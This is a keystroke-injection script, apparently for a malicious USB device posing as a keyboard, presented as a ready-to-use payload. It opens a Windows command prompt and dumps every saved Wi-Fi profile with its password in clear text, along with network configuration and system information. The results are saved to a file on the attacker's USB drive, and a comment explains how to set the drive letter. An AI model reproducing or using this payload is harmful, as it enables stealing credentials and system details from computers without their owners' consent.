layout('us');
press("GUI r");
delay(500) ;
type("cmd")
press("ENTER");
delay(1000);
type("((((mode con:cols=100 lines=3000) & for /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear) & ipconfig -all) & systeminfo) > G:\wifipass.txt") //change the drive letter to the one your usb is
press("ENTER");
delay(10000);
type("exit")
press("ENTER")